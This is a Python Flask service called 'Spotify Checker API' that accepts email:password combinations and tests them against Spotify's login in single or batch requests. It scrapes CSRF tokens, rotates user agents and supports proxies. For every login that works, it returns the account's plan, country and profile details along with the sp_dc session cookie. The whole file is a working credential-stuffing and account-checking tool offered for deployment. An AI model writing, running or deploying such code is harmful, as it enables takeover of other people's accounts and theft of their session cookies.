
#!/usr/bin/env python3
"""
SPOTIFY CHECKER API - For Render.com Deployment
Accepts email:password combos and returns account info
"""

from flask import Flask, request, jsonify
import requests
import time
import random
import json
import re
from functools import wraps

app = Flask(__name__)

# API Configuration
API_KEY = "your-secret-api-key-here-change-this"  # Change this!
RATE_LIMIT = 100  # requests per minute

# User agents for rotation
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

# Simple rate limiting
request_counts = {}

def require_api_key(f):
    """Decorator to require API key authentication"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        api_key = request.headers.get('X-API-Key')
        if not api_key or api_key != API_KEY:
            return jsonify({'success': False, 'error': 'Invalid or missing API key'}), 401
        return f(*args, **kwargs)
    return decorated_function

def rate_limit_check(ip):
    """Simple rate limiting"""
    current_minute = int(time.time() / 60)
    key = f"{ip}:{current_minute}"

    if key in request_counts:
        if request_counts[key] >= RATE_LIMIT:
            return False
        request_counts[key] += 1
    else:
        request_counts[key] = 1

    # Cleanup old entries
    for k in list(request_counts.keys()):
        if not k.endswith(str(current_minute)):
            del request_counts[k]

    return True

class SpotifyAuthenticator:
    """Handles Spotify authentication via web requests"""

    def __init__(self, email, password, proxy=None):
        self.email = email
        self.password = password
        self.proxy = proxy
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://accounts.spotify.com",
            "Referer": "https://accounts.spotify.com/en/login"
        })

    def get_csrf_token(self):
        """Extract CSRF token from login page"""
        try:
            response = self.session.get(
                "https://accounts.spotify.com/en/login",
                proxies=self.proxy,
                timeout=15
            )

            # Try to find csrf_token in response
            match = re.search(r'"csrf_token":"([^"]+)"', response.text)
            if match:
                return match.group(1)

            match = re.search(r'name="csrf_token"\s+value="([^"]+)"', response.text)
            if match:
                return match.group(1)

            return None
        except Exception as e:
            return None

    def login(self):
        """Attempt authentication"""
        try:
            # Get CSRF token
            csrf_token = self.get_csrf_token()

            # Prepare login data
            login_data = {
                "username": self.email,
                "password": self.password,
                "remember": "true"
            }

            if csrf_token:
                login_data["csrf_token"] = csrf_token

            # Attempt login
            response = self.session.post(
                "https://accounts.spotify.com/login/password",
                data=login_data,
                proxies=self.proxy,
                timeout=20,
                allow_redirects=False
            )

            # Check for successful login via cookies
            cookies = self.session.cookies
            sp_dc = cookies.get('sp_dc')

            if sp_dc:
                # Try to get account info
                account_info = self.get_account_info()
                if account_info:
                    return {
                        'success': True,
                        'email': self.email,
                        'account_info': account_info,
                        'sp_dc': sp_dc
                    }

            # Check response for errors
            if response.status_code == 200:
                try:
                    data = response.json()
                    if data.get('error'):
                        return {'success': False, 'error': data.get('error')}
                except:
                    pass

            # Check if redirected (successful login)
            if response.status_code in [302, 303, 307]:
                location = response.headers.get('Location', '')
                if 'login' not in location:
                    account_info = self.get_account_info()
                    return {
                        'success': True,
                        'email': self.email,
                        'account_info': account_info or {'product': 'unknown'}
                    }

            return {'success': False, 'error': 'Invalid credentials'}

        except requests.exceptions.Timeout:
            return {'success': False, 'error': 'Request timeout'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def get_account_info(self):
        """Get account information from Spotify API"""
        try:
            # Try to get account info from API
            response = self.session.get(
                "https://api.spotify.com/v1/me",
                proxies=self.proxy,
                timeout=15
            )

            if response.status_code == 200:
                data = response.json()
                return {
                    'email': data.get('email', self.email),
                    'display_name': data.get('display_name', 'N/A'),
                    'country': data.get('country', 'N/A'),
                    'product': data.get('product', 'free'),
                    'followers': data.get('followers', {}).get('total', 0),
                    'uri': data.get('uri', 'N/A')
                }

            # Alternative: Try to get from web endpoint
            response = self.session.get(
                "https://www.spotify.com/api/account/v1/datalayer/",
                proxies=self.proxy,
                timeout=15
            )

            if response.status_code == 200:
                data = response.json()
                user_data = data.get('user', {})
                return {
                    'email': self.email,
                    'display_name': user_data.get('display_name', 'N/A'),
                    'country': user_data.get('country', 'N/A'),
                    'product': user_data.get('product', 'free'),
                }

            return None

        except Exception:
            return None

# API Routes

@app.route('/')
def index():
    """API info page"""
    return jsonify({
        'name': 'Spotify Checker API',
        'version': '1.0',
        'status': 'online',
        'endpoints': {
            '/check': 'POST - Check single account',
            '/batch': 'POST - Check multiple accounts',
            '/health': 'GET - Health check'
        },
        'authentication': 'X-API-Key header required'
    })

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({'status': 'healthy', 'timestamp': time.time()})

@app.route('/check', methods=['POST'])
@require_api_key
def check_account():
    """Check single Spotify account"""
    ip = request.remote_addr

    # Rate limiting
    if not rate_limit_check(ip):
        return jsonify({'success': False, 'error': 'Rate limit exceeded'}), 429

    data = request.json
    if not data:
        return jsonify({'success': False, 'error': 'Invalid request body'}), 400

    email = data.get('email')
    password = data.get('password')
    proxy = data.get('proxy')  # Optional

    if not email or not password:
        return jsonify({'success': False, 'error': 'Email and password required'}), 400

    # Format proxy if provided
    proxy_dict = None
    if proxy:
        if not proxy.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
            proxy = f"http://{proxy}"
        proxy_dict = {'http': proxy, 'https': proxy}

    # Authenticate
    authenticator = SpotifyAuthenticator(email, password, proxy_dict)
    result = authenticator.login()

    return jsonify(result)

@app.route('/batch', methods=['POST'])
@require_api_key
def check_batch():
    """Check multiple accounts (max 10 per request)"""
    ip = request.remote_addr

    if not rate_limit_check(ip):
        return jsonify({'success': False, 'error': 'Rate limit exceeded'}), 429

    data = request.json
    if not data or 'accounts' not in data:
        return jsonify({'success': False, 'error': 'Invalid request body'}), 400

    accounts = data.get('accounts', [])

    if not accounts or len(accounts) == 0:
        return jsonify({'success': False, 'error': 'No accounts provided'}), 400

    if len(accounts) > 10:
        return jsonify({'success': False, 'error': 'Maximum 10 accounts per batch'}), 400

    results = []

    for account in accounts:
        email = account.get('email')
        password = account.get('password')

        if not email or not password:
            results.append({
                'email': email or 'unknown',
                'success': False,
                'error': 'Missing credentials'
            })
            continue

        authenticator = SpotifyAuthenticator(email, password)
        result = authenticator.login()
        results.append(result)

        # Small delay between checks
        time.sleep(0.5)

    return jsonify({'success': True, 'results': results})

if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
